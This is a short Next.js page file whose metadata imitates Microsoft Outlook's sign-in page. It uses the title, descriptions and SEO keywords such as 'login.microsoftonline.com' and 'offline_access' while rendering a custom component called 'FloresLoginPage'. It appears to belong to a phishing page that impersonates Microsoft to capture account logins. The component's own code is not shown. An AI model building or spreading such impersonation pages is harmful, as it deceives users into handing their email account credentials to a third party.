import { FloresLoginPage } from "@/components/flores-login-page";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "Microsoft Outlook | Sign in",
  description:
    "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
  keywords: [
    "Microsoft Outlook login",
    "Outlook Mail sign in",
    "Office 365 login",
    "Microsoft account login",
    "login.microsoftonline.com",
    "Outlook email",
    "OpenID login",
    "offline_access",
    "profile access",
    "Microsoft auth",
  ],
  openGraph: {
    title: "Microsoft Outlook | Sign in",
    description:
      "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
    type: "website",
    url: "/",
  },
  alternates: {
    canonical: "/",
  },
};

export default function Page() {
  return <FloresLoginPage />;
}
